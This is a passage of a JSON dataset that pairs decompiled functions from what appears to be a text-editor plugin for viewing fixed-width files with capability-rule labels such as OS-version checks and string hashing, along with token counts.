ppcVar5;\n            }\n            fcn.180071848(arg3, ppcVar7, iVar10);\n            if (*0x180128a60 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a60 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a60 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a60;\n            ppcVar7 = fcn.18008fb2c(0x18);\n            appcStack56[0] = ppcVar7;\n            if (ppcVar7 != NULL) {\n                *(ppcVar7 + 1) = 0;\n                *ppcVar7 = \n                vtable.std::time_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n                ppcVar7[2] = NULL;\n                pcVar8 = fcn.1800b1bc0();\n                ppcVar7[2] = pcVar8;\n                fcn.1800b2bb8(0);\n                arg2_00 = ppcVar7;\n            }\n        }\n        else {\n            if (*0x180128a58 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a58 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a58 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a58;\n            uVar9 = fcn.180089c78(arg4);\n            fcn.180071848(arg3, uVar9, iVar10);\n            if (*0x180128a60 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128a60 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128a60 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar10 = *0x180128a60;\n            arg2_00 = fcn.180089dac(arg4);\n        }\n        fcn.180071848(arg3, arg2_00, iVar10);\n    }\n    return;\n}\n",
        "token_count": 3739
    },
    "18001567": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.180015670(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar (*pauVar3) [16];\n    int64_t iVar4;\n    \n    iVar1 = *(arg2 + 8);\n    if (iVar1 == 8) {\n        uVar2 = 9;\n    }\n    else {\n        uVar2 = 0xc;\n        if ((iVar1 != 10) && (uVar2 = 0xe,  iVar1 == 0xb)) {\n            uVar2 = 0xc;\n        }\n    }\n    pauVar3 = fcn.18008fb2c(0x28);\n    *pauVar3 = ZEXT816(0);\n    pauVar3[1] = ZEXT816(0);\n    *(pauVar3[1] + 8) = 0;\n    *(*pauVar3 + 0xc) = 0;\n    *pauVar3[1] = 0;\n    **pauVar3 = vtable.std::_Node_end_group.0;\n    *(*pauVar3 + 8) = uVar2;\n    *pauVar3[2] = arg2;\n    *(pauVar3[1] + 8) = *(arg1 + 8);\n    iVar4 = *(arg1 + 8);\n    if (*(iVar4 + 0x10) != 0) {\n        *pauVar3[1] = *(iVar4 + 0x10);\n        *(*(*(arg1 + 8) + 0x10) + 0x18) = pauVar3;\n        iVar4 = *(arg1 + 8);\n    }\n    *(iVar4 + 0x10) = pauVar3;\n    *(arg1 + 8) = pauVar3;\n    return;\n}\n",
        "token_count": 410
    },
    "180035e9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.180035e90(ulong noname_0, int64_t **arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    ulong *puVar5;\n    uchar *arg1;\n    int64_t iVar6;\n    int64_t *arg1_00;\n    int64_t **arg2_00;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    ulong *arg3_00;\n    uint64_t uVar10;\n    uchar auStack376 [32];\n    uchar *puStack344;\n    uchar *puStack336;\n    uchar uStack328;\n    unkbyte7 Stack327;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    ushort uStack296;\n    unkbyte6 Stack294;\n    ulong uStack280;\n    uint64_t uStack272;\n    uchar uStack264;\n    unkbyte7 Stack263;\n    ulong uStack248;\n    uint64_t uStack240;\n    uchar auStack232 [16];\n    ulong uStack216;\n    ulong uStack208;\n    ulong uStack200;\n    uchar *puStack192;\n    uchar auStack184 [128];\n    int64_t **ppiStack56;\n    uint64_t uStack48;\n    \n    uStack200 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack376;\n    ppiStack56 = arg2;\n    if (arg2 != 0x180124108) {\n        arg2_00 = arg2;\n        if (0xf < arg2[3]) {\n            arg2_00 = *arg2;\n        }\n        fcn.180011120(0x180124108, arg2_00, arg2[2]);\n    }\n    puStack192 = auStack232;\n    uVar10 = 0;\n    uStack216 = 0;\n    uStack208 = 0xf;\n    auStack232[0] = 0;\n    *0x180124148 = arg3;\n    fcn.180011120(auStack232, 0x1800f46de, 0);\n    uStack312 = *0x180101910;\n    uStack308 = *0x180101914;\n    uStack304 = *0x180101918;\n    uStack300 = *0x18010191c;\n    uStack328 = 0;\n    fcn.180011120(&uStack328, 0x1800f46df, 0);\n    uStack248 = CONCAT44(*0x180101914, *0x180101910);\n    uStack240 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack264 = 0;\n    arg1 = &uStack264;\n    fcn.180011120(arg1, 0x1800f6f50, 9);\n    puStack336 = auStack232;\n    puStack344 = &uStack328;\n    uVar4 = fcn.180004f50(arg1, &uStack296, 0x180124108, &uStack264);\n    iVar6 = 0x180124128;\n    fcn.18000d960(0x180124128, uVar4);\n    if (uStack272 < 8) {\ncode_r0x000180035ff1:\n        uStack280 = *0x180101900;\n        uStack272 = *0x180101908;\n        uStack296 = 0;\n        if (0xf < uStack240) {\n            iVar3 = CONCAT71(Stack263, uStack264);\n            iVar6 = iVar3;\n            if ((uStack240 + 1 < 0x1000) || (iVar6 = *(iVar3 + -8),  (iVar3 - iVar6) - 8U < 0x20)) {\n                fcn.18008fb24(iVar6);\n                goto code_r0x000180036041;\n            }\n            goto code_r0x000180036327;\n        }\ncode_r0x000180036041:\n        uStack248 = CONCAT44(*0x180101914, *0x180101910);\n        uStack240 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack264 = 0;\n        if (0xf < CONCAT44(uStack300, uStack304)) {\n            iVar3 = CONCAT71(Stack327, uStack328);\n            iVar6 = iVar3;\n            if ((CONCAT44(uStack300, uStack304) + 1 < 0x1000) || (iVar6 = *(iVar3 + -8),  (iVar3 - iVar6) - 8U < 0x20))\n            {\n                fcn.18008fb24(iVar6);\n                goto code_r0x000180036090;\n            }\n            goto code_r0x00018003632d;\n        }\ncode_r0x000180036090:\n        puVar5 = fcn.180004ab0(iVar6, &uStack328, 3);\n        uVar4 = fcn.1800687b0(auStack184);\n        arg3_00 = puVar5;\n        if (7 < puVar5[3]) {\n            arg3_00 = *puVar5;\n        }\n        fcn.180068c50(uVar4, &uStack296, arg3_00, arg3_00 + puVar5[2] * 2);\n        fcn.1800686c0(auStack184);\n        fcn.18000dd60(0x1801240e8, &uStack296);\n        if (uStack272 < 0x10) {\ncode_r0x000180036128:\n            uVar9 = uVar10;\n            if (7 < CONCAT44(uStack300, uStack304)) {\n                iVar3 = CONCAT71(Stack327, uStack328);\n                iVar6 = iVar3;\n                if ((0xfff < CONCAT44(uStack300, uStack304) * 2 + 2) &&\n                   (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U)) goto code_r0x000180036339;\n                fcn.18008fb24(iVar6);\n            }\n            do {\n                uVar4 = (**0x1800de798)(*0x1801240c8, uVar9 + 0x2559);\n                (**0x1800de7f0)(uVar4, 0x14b, 0, 0);\n                (**0x1800de7f0)(uVar4, 0x143, 0);\n                (**0x1800de7f0)(uVar4, 0x14e, 0);\n                (**0x1800de5b8)(uVar4, 0, 0);\n                iVar6 = ((*0x180124148)[1] - **0x180124148) / 0xe8;\n                if (iVar6 != 0) {\n                    uVar7 = uVar10;\n                    if (iVar6 == 0) {\n                        fcn.18003c1b0();\n                        goto code_r0x00018003631b;\n                    }\n                    do {\n                        (**0x1800de7f0)(uVar4, 0x143, 0);\n                        uVar7 = uVar7 + 1;\n                    } while (uVar7 < ((*0x180124148)[1] - **0x180124148) / 0xe8);\n                }\n                uVar8 = uVar9 + 1;\n                uVar9 = uVar8;\n            } while (uVar8 < 10);\n            fcn.1800389c0(0x1801240b0);\n            fcn.18003b4b0(0x1801240b0);\n            fcn.180036d10(0x1801240b0, 0);\n            if (arg2[3] < 0x10) {\ncode_r0x0001800362d8:\n                arg2[2] = NULL;\n                arg2[3] = 0xf;\n                *arg2 = 0;\n                fcn.18008fb00(uStack48 ^ auStack376);\n                return;\n            }\n            piVar1 = *arg2;\n            arg1_00 = piVar1;\n            if ((arg2[3] + 1U < 0x1000) || (arg1_00 = piVar1[-1],  piVar1 + (-8 - arg1_00) < 0x20)) {\n                fcn.18008fb24(arg1_00);\n                goto code_r0x0001800362d8;\n            }\ncode_r0x00018003631b:\n            fcn.1800b3528();\n            goto code_r0x000180036321;\n        }\n        iVar3 = CONCAT62(Stack294, uStack296);\n        iVar6 = iVar3;\n        if ((uStack272 + 1 < 0x1000) || (iVar6 = *(iVar3 + -8),  (iVar3 - iVar6) - 8U < 0x20)) {\n            fcn.18008fb24(iVar6);\n            goto code_r0x000180036128;\n        }\n    }\n    else {\n        iVar3 = CONCAT62(Stack294, uStack296);\n        iVar6 = iVar3;\n        if ((uStack272 * 2 + 2 < 0x1000) || (iVar6 = *(iVar3 + -8),  (iVar3 - iVar6) - 8U < 0x20)) {\n            fcn.18008fb24(iVar6);\n            goto code_r0x000180035ff1;\n        }\ncode_r0x000180036321:\n        fcn.1800b3528();\ncode_r0x000180036327:\n        fcn.1800b3528();\ncode_r0x00018003632d:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x000180036339:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 2292
    },
    "1800373c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.1800373c0(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    ulong ****ppppuVar5;\n    ulong ****ppppuVar6;\n    int64_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int64_t iVar11;\n    uchar auStack200 [32];\n    ulong uStack168;\n    ulong ****appppuStack152 [2];\n    ulong uStack136;\n    uint64_t uStack128;\n    uint uStack120;\n    uint uStack116;\n    ulong ****appppuStack112 [2];\n    ulong uStack96;\n    uint64_t uStack88;\n    uint64_t uStack72;\n    \n    uStack168 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack200;\n    uVar10 = *(arg1 + 0x34);\n    iVar8 = uVar10 * 10 + arg3;\n    uVar4 = (**0x1800de7b0)();\n    iVar3 = (**0x1800de780)(uVar4);\n    iVar9 = 0x2545;\n    if (iVar3 - *(arg1 + 0x30) == 0x2581) {\n        iVar9 = 0x2581;\n    }\n    if ((-1 < iVar8) && (iVar8 < (*(arg1 + 0xc0) - *(arg1 + 0xb8)) / 0x48)) {\n        fcn.18003b930(arg1);\n        iVar7 = (uVar10 * 10 + arg2) * 0x48;\n        iVar11 = iVar8 * 0x48;\n        if (arg3 < 10) {\n            fcn.1800371d0(arg1, arg2, *(arg1 + 0xb8) + iVar11);\n            fcn.1800371d0(arg1, arg3, *(arg1 + 0xb8) + iVar7);\n        }\n        else {\n            ppppuVar5 = *(arg1 + 0xb8) + iVar7;\n            iVar7 = *(arg1 + 0xb8) + iVar11;\n            fcn.18000da90(appppuStack152, iVar7);\n            uStack120 = *(iVar7 + 0x20);\n            uStack116 = *(iVar7 + 0x24);\n            fcn.18000da90(appppuStack112, iVar7 + 0x28);\n            fcn.1800371d0(arg1, arg2, *(arg1 + 0xb8) + iVar11);\n            if (ppppuVar5 != appppuStack152) {\n                ppppuVar6 = appppuStack152;\n                if (7 < uStack128) {\n                    ppppuVar6 = appppuStack152[0];\n                }\n                fcn.180010d70(ppppuVar5, ppppuVar6, uStack136);\n            }\n            *(ppppuVar5 + 4) = uStack120;\n            *(ppppuVar5 + 0x24) = uStack116;\n            if (ppppuVar5 + 5 != appppuStack112) {\n                ppppuVar6 = appppuStack112;\n                if (7 < uStack88) {\n                    ppppuVar6 = appppuStack112[0];\n                }\n                fcn.180010d70(ppppuVar5 + 5, ppppuVar6, uStack96);\n            }\n            if (arg3 < 0) {\n                arg3._0_4_ = 9;\n                uVar10 = uVar10 - 1;\n            }\n            else if (9 < arg3) {\n                arg3._0_4_ = 0;\n                uVar10 = uVar10 + 1;\n            }\n            if (7 < uStack88) {\n                uVar1 = uStack88 * 2 + 2;\n                ppppuVar5 = appppuStack112[0];\n                if ((0xfff < uVar1) && (ppppuVar5 = appppuStack112[0][-1],  0x1f < appppuStack112[0] + (-8 - ppppuVar5))\n                   ) goto code_r0x000180037650;\n                fcn.18008fb24(ppppuVar5);\n            }\n            if (7 < uStack128) {\n                uVar1 = uStack128 * 2 + 2;\n                ppppuVar5 = appppuStack152[0];\n                if ((0xfff < uVar1) && (ppppuVar5 = appppuStack152[0][-1],  0x1f < appppuStack152[0] + (-8 - ppppuVar5))\n                   ) {\ncode_r0x000180037650:\n                    fcn.1800b3528(ppppuVar5, uVar1 + 0x27);\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                fcn.18008fb24(ppppuVar5);\n            }\n        }\n        fcn.18003b5c0(arg1, uVar10);\n        uVar4 = (**0x1800de798)(*(arg1 + 0x18), arg3 + iVar9);\n        (**0x1800de6f0)(uVar4);\n    }\n    fcn.18008fb00(uStack72 ^ auStack200);\n    return;\n}\n",
        "token_count": 1257
    },
    "18003766": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.180037660(ulong noname_0, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = *0x1801240e4;\n    arg2._0_4_ = arg2 - *0x1801240e0;\n    iVar1 = arg3 + *0x1801240e4 * 10;\n    if ((-1 < iVar1) && (iVar1 < (*0x180124170 - *0x180124168) / 0x48)) {\n        if (9 < arg3) {\n            fcn.18003b930(0x1801240b0);\n            if (arg3 < 0) {\n                arg3._0_4_ = 9;\n                uVar3 = uVar3 - 1;\n            }\n            else if (9 < arg3) {\n                arg3._0_4_ = 0;\n                uVar3 = uVar3 + 1;\n            }\n            fcn.18003b5c0(0x1801240b0, uVar3);\n        }\n        uVar2 = (**0x1800de798)(*0x1801240c8, arg2 + arg3);\n        (**0x1800de6f0)(uVar2);\n    }\n    return;\n}\n",
        "token_count": 306
    },
    "18003b93": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.18003b930(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    \n    iVar3 = *(arg1 + 0x34) * 10;\n    uVar2 = iVar3 + 10;\n    if ((*(arg1 + 0xc0) - *(arg1 + 0xb8)) / 0x48 < uVar2) {\n        fcn.18003bf80(arg1 + 0xb8, uVar2);\n    }\n    uVar2 = 0;\n    iVar3 = iVar3 * 0x48;\n    do {\n        fcn.1800371d0(arg1, uVar2, *(arg1 + 0xb8) + iVar3);\n        uVar1 = uVar2 + 1;\n        uVar2 = uVar1;\n        iVar3 = iVar3 + 0x48;\n    } while (uVar1 < 10);\n    return;\n}\n",
        "token_count": 223
    },
    "18004b3b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004b3b0(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack120 [32];\n    ulong uStack88;\n    uchar uStack72;\n    ulong uStack56;\n    ushort uStack48;\n    unkbyte6 Stack46;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack120;\n    *(arg1 + 8) = arg2;\n    uStack88 = 0;\n    (**0x1800de730)(arg2, 0x2713, 0xc5);\n    uStack88 = 0;\n    (**0x1800de730)(*(arg1 + 8), 0x2716, 0xc5);\n    uVar2 = (**0x1800de798)(*(arg1 + 8), 0x2713);\n    (**0x1800de010)(uVar2, 0x18004bd20, 0);\n    uVar2 = (**0x1800de798)(*(arg1 + 8), 0x2716);\n    (**0x1800de010)(uVar2, 0x18004bd20, 0);\n    iVar3 = (**0x1800de7f0)(*0x18012a390, 0x812, 0);\n    iVar4 = 0x1800f9518;\n    if (9 < iVar3) {\n        iVar4 = 0x1800f95f8;\n    }\n    uStack32 = *0x180101900;\n    uStack28 = *0x180101904;\n    uStack24 = *0x180101908;\n    uStack20 = *0x18010190c;\n    uStack48 = 0;\n    iVar5 = -1;\n    do {\n        iVar5 = iVar5 + 1;\n    } while (*(iVar4 + iVar5 * 2) != 0);\n    fcn.180010d70(&uStack48, iVar4, iVar5);\n    uStack72 = 0;\n    uStack88 = CONCAT44(uStack88._4_4_, 400);\n    fcn.180068420(*(arg1 + 8), 0x271b, &uStack48, (9 < iVar3) + 7);\n    fcn.18004b8c0(arg1);\n    if (7 < CONCAT44(uStack20, uStack24)) {\n        iVar3 = CONCAT44(uStack20, uStack24) * 2;\n        iVar5 = CONCAT62(Stack46, uStack48);\n        iVar4 = iVar5;\n        if (0xfff < iVar3 + 2U) {\n            iVar4 = *(iVar5 + -8);\n            if (0x1f < (iVar5 - iVar4) - 8U) {\n                fcn.1800b3528(iVar4, iVar3 + 0x29);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar4);\n    }\n    fcn.18008fb00(uStack16 ^ auStack120);\n    return;\n}\n",
        "token_count": 775
    },
    "1800544f": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800544f0(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    ulong *puVar6;\n    uchar *puVar7;\n    char16_t *arg2;\n    int64_t iVar8;\n    uchar auStack232 [32];\n    uint uStack200;\n    uchar uStack184;\n    uchar auStack168 [16];\n    ulong uStack152;\n    ulong uStack144;\n    uchar auStack136 [16];\n    ulong uStack120;\n    ulong uStack112;\n    uchar *puStack104;\n    uchar *puStack96;\n    int64_t aiStack88 [3];\n    uint64_t uStack64;\n    ulong uStack56;\n    ushort uStack48;\n    unkbyte6 Stack46;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack232;\n    iVar4 = (**0x1800de7f0)(*0x18012a390, 0x812, 0);\n    arg2 = L\"Courier New\";\n    if (9 < iVar4) {\n        arg2 = 0x1800fa770;\n    }\n    uStack32 = *0x180101900;\n    uStack28 = *0x180101904;\n    uStack24 = *0x180101908;\n    uStack20 = *0x18010190c;\n    uStack48 = 0;\n    iVar8 = -1;\n    do {\n        iVar8 = iVar8 + 1;\n    } while (arg2[iVar8] != L'\\0');\n    fcn.180010d70(&uStack48, arg2, iVar8);\n    uVar3 = 8;\n    if (9 < iVar4) {\n        uVar3 = 10;\n    }\n    *0x180124855 = fcn.18000bcf0();\n    if (*0x180124855 != '\\0') {\n        fcn.18004b2d0();\n        uStack184 = 1;\n        uStack200 = 700;\n        fcn.180068420(*0x1801247a8, 0x233d, &uStack48, uVar3);\n        uStack184 = 0;\n        uStack200 = 400;\n        fcn.180068420(*0x1801247a8, 0x233e, &uStack48, uVar3);\n        uVar5 = (**0x1800de798)(*0x1801247a8, 0x235c);\n        iVar4 = (**0x1800de638)(*0x18012a388, 0x2335);\n        if (iVar4 != 0) {\n            (**0x1800de7f0)(uVar5, 0xf7, 0, iVar4);\n            (**0x1800de0a8)(iVar4);\n        }\n        uStack200 = uStack200 & 0xffffff00;\n        fcn.180067d90(*0x1801247a8, 0x235c, 0, 0x1800fa7b0);\n        uVar5 = (**0x1800de798)(*0x1801247a8, 0x232a);\n        iVar4 = (**0x1800de638)(*0x18012a388, 0x2332);\n        if (iVar4 != 0) {\n            (**0x1800de7f0)(uVar5, 0xf7, 0, iVar4);\n            (**0x1800de0a8)(iVar4);\n        }\n        uStack200 = uStack200 & 0xffffff00;\n        fcn.180067d90(*0x1801247a8, 0x232a, 0, L\"View Sample Files\");\n        uVar5 = (**0x1800de798)(*0x1801247a8, 0x232b);\n        iVar4 = (**0x1800de638)(*0x18012a388, 0x2333);\n        if (iVar4 != 0) {\n            (**0x1800de7f0)(uVar5, 0xf7, 0, iVar4);\n            (**0x1800de0a8)(iVar4);\n        }\n        uStack200 = uStack200 & 0xffffff00;\n        fcn.180067d90(*0x1801247a8, 0x232b, 0, L\"Open File Type Metadata Editor\");\n        uVar5 = (**0x1800de798)(*0x1801247a8, 0x232e);\n        iVar4 = (**0x1800de638)(*0x18012a388, 0x2334);\n        if (iVar4 != 0) {\n            (**0x1800de7f0)(uVar5, 0xf7, 0, iVar4);\n            (**0x1800de0a8)(iVar4);\n        }\n        uStack200 = uStack200 & 0xffffff00;\n        fcn.180067d90(*0x1801247a8, 0x232e, 0, L\"Open Visualizer Theme Editor\");\n        puStack104 = auStack168;\n        uStack152 = 0;\n        uStack144 = 0xf;\n        auStack168[0] = 0;\n        fcn.180011120(auStack168, 0x1800f47af, 0);\n        uStack120 = 0;\n        uStack112 = 0xf;\n        auStack136[0] = 0;\n        puVar7 = auStack136;\n        fcn.180011120(puVar7, 0x1800fa858, 0xe);\n        puVar6 = fcn.180007730(puVar7, aiStack88, auStack136, auStack168);\n        if (7 < puVar6[3]) {\n            puVar6 = *puVar6;\n        }\n        uVar5 = (**0x1800de798)(*0x1801247a8, 0x236b);\n        (**0x1800de778)(uVar5, puVar6);\n        if (uStack64 < 8) {\ncode_r0x000180054875:\n            puStack96 = auStack136;\n            uStack120 = 0;\n            uStack112 = 0xf;\n            auStack136[0] = 0;\n            fcn.180011120(auStack136, 0x1800f47b2, 0);\n            uStack152 = 0;\n            uStack144 = 0xf;\n            auStack168[0] = 0;\n            puVar7 = auStack168;\n            fcn.180011120(puVar7, 0x1800fa868, 0xe);\n            puVar6 = fcn.180007730(puVar7, aiStack88, auStack168, auStack136);\n            if (7 < puVar6[3]) {\n                puVar6 = *puVar6;\n            }\n            uVar5 = (**0x1800de798)(*0x1801247a8, 0x2370);\n            (**0x1800de778)(uVar5, puVar6);\n            if (7 < uStack64) {\n                iVar4 = aiStack88[0];\n                if ((0xfff < uStack64 * 2 + 2) && (iVar4 = *(aiStack88[0] + -8),  0x1f < (aiStack88[0] - iVar4) - 8U))\n                goto code_r0x000180054d46;\n                fcn.18008fb24(iVar4);\n            }\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x2330, 0, \n                                  L\"If \\\"Auto-detect File Type\\\" option is:\\r\\n\u00e2\u2014\\x8f Checked: Redo the file type detection and visualization.\\r\\n\u00e2\u2014\\x8f Not checked: Clear the document\\'s fixed-width visualization.\\r\\n\\r\\nTo always clear visualization, modify the setting in \\\"Preferences\\\".\"\n                                 );\n            (**0x1800de7f0)(uVar5, 0x403, 2, 20000);\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x2368, 0, \n                                  L\"When copying a field, trim padding character(s) on either the left or right,\\r\\nbased on which field edge is closer to the cursor position.\"\n                                 );\n            (**0x1800de7f0)(uVar5, 0x403, 2, 10000);\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x2365, 0, \n                                  L\"Move cursor to the left edge of the current field.\\r\\n\\r\\n\u00e2\u2014\\x8f If already at the left edge of the field, the cursor will be moved to the left edge of the preceding field.\\r\\n\\r\\nAccessible via keyboard shortcut. See the plugin menu.\"\n                                 );\n            (**0x1800de7f0)(uVar5, 0x403, 2, 10000);\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x2366, 0, \n                                  L\"Move cursor to the right edge of the current field.\\r\\n\\r\\n\u00e2\u2014\\x8f If already at the right edge of the field, the cursor will be moved to the right edge of the following field.\\r\\n\\r\\nAccessible via keyboard shortcut. See the plugin menu.\"\n                                 );\n            (**0x1800de7f0)(uVar5, 0x403, 2, 10000);\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x2367, 0, \n                                  L\"Copy current field data.\\r\\n\\r\\n\u00e2\u2014\\x8f If \\\"Trim Field Copy\\\" option is checked, field data will be trimmed off padding character(s) on either the left or right edge, based on which field edge is closer to the cursor position.\\r\\n\\r\\nAccessible via keyboard shortcut. See the plugin menu.\"\n                                 );\n            (**0x1800de7f0)(uVar5, 0x403, 2, 20000);\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x2369, 0, \n                                  L\"Paste clipboard text into current field, replacing its current contents.\\r\\n\\r\\n\u00e2\u2014\\x8f Aligned either to the left or the right edge of the field, based on which field edge is closer to the cursor position.\\r\\n\u00e2\u2014\\x8f If the clipboard text is shorter than the field width, it will be paddded on the opposite edge of the aligned edge.\\r\\n\u00e2\u2014\\x8f If the clipboard text is longer, it will be trimmed to the field width.\\r\\n\\r\\nAccessible via keyboard shortcut. See the plugin menu.\"\n                                 );\n            (**0x1800de7f0)(uVar5, 0x403, 2, 30000);\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x236a, 0, 0x1800fb810);\n            (**0x1800de7f0)(uVar5, 0x403, 2, 30000);\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x236d, 0, 0x1800fb540);\n            (**0x1800de7f0)(uVar5, 0x403, 2, 30000);\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x236c, 0, 0x1800fbd80);\n            (**0x1800de7f0)(uVar5, 0x403, 2, 30000);\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x236e, 0, 0x1800fbad0);\n            (**0x1800de7f0)(uVar5, 0x403, 2, 30000);\n            uStack200._0_1_ = 1;\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x236f, 0, 0x1800fc300);\n            (**0x1800de7f0)(uVar5, 0x403, 2, 30000);\n            uStack200 = CONCAT31(uStack200._1_3_, 1);\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x2371, 0, 0x1800fc050);\n            (**0x1800de7f0)(uVar5, 0x403, 2, 30000);\n            uVar5 = (**0x1800de798)(*0x1801247a8, 0x237f);\n            iVar4 = (**0x1800de638)(*0x18012a388, 0x2335);\n            if (iVar4 != 0) {\n                (**0x1800de7f0)(uVar5, 0xf7, 0, iVar4);\n                (**0x1800de0a8)(iVar4);\n            }\n            uStack200 = uStack200 & 0xffffff00;\n            fcn.180067d90(*0x1801247a8, 0x237f, 0, L\"View Readme Online\");\n            uStack200 = CONCAT31(uStack200._1_3_, 1);\n            uVar5 = fcn.180067d90(*0x1801247a8, 0x2361, L\"Active INI Files\", \n                                  L\"\\nNOTE: Click the button to refresh the files list\");\n            (**0x1800de7f0)(uVar5, 0x403, 2, 20000);\n            uStack184 = 0;\n            uStack200 = 400;\n            *0x180124830 = uVar5;\n            fcn.180068420(*0x1801247a8, 0x235e, &uStack48, 9);\n            goto code_r0x000180054cd9;\n        }\n        iVar4 = aiStack88[0];\n        if ((uStack64 * 2 + 2 < 0x1000) || (iVar4 = *(aiStack88[0] + -8),  (aiStack88[0] - iVar4) - 8U < 0x20)) {\n            fcn.18008fb24(iVar4);\n            goto code_r0x000180054875;\n        }\ncode_r0x000180054d40:\n        fcn.1800b3528();\ncode_r0x000180054d46:\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\ncode_r0x000180054cd9:\n    if (CONCAT44(uStack20, uStack24) < 8) goto code_r0x000180054d15;\n    iVar4 = CONCAT44(uStack20, uStack24) * 2;\n    iVar2 = CONCAT62(Stack46, uStack48);\n    iVar8 = iVar2;\n    if (0xfff < iVar4 + 2U) {\n        iVar8 = *(iVar2 + -8);\n        if (0x1f < (iVar2 - iVar8) - 8U) {\n            fcn.1800b3528(iVar8, iVar4 + 0x29);\n            goto code_r0x000180054d40;\n        }\n    }\n    fcn.18008fb24(iVar8);\ncode_r0x000180054d15:\n    fcn.18008fb00(uStack16 ^ auStack232);\n    return;\n}\n",
        "token_count": 3765
    },
    "180017d6": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
